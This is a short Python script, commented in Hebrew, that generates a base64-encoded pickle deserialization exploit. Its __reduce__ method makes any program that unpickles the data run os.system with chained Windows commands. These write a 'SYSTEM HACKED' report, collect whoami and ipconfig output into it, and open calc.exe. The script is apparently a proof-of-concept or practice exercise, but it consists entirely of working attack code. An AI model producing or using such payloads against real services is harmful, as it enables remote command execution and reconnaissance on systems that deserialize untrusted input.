import pickle
import base64
import os


class Combo_Payload:
    def __reduce__(self):
        # שרשור פקודות (Chaining):
        # 1. יצירת הדוח וכתיבת הכותרת
        # 2. הוספת מידע משתמש (whoami)
        # 3. הוספת הגדרות רשת (ipconfig)
        # 4. בסוף - הקפצת המחשבון

        # הסימן & אומר למערכת ההפעלה: "תעשה את זה, ואז תעשה את זה"
        cmd = (
            'echo [SYSTEM HACKED] > HACK_REPORT.txt & '
            'echo [USER] >> HACK_REPORT.txt & '
            'whoami >> HACK_REPORT.txt & '
            'echo [NETWORK] >> HACK_REPORT.txt & '
            'ipconfig >> HACK_REPORT.txt & '
            'calc.exe'
        )

        return (os.system, (cmd,))


def generate_exploit():
    payload = Combo_Payload()
    serialized = pickle.dumps(payload)
    encoded = base64.b64encode(serialized).decode()

    print(f"\n[+] COMBO PAYLOAD GENERATED (File + Calc):\n")
    print(encoded)


if __name__ == '__main__':
    generate_exploit()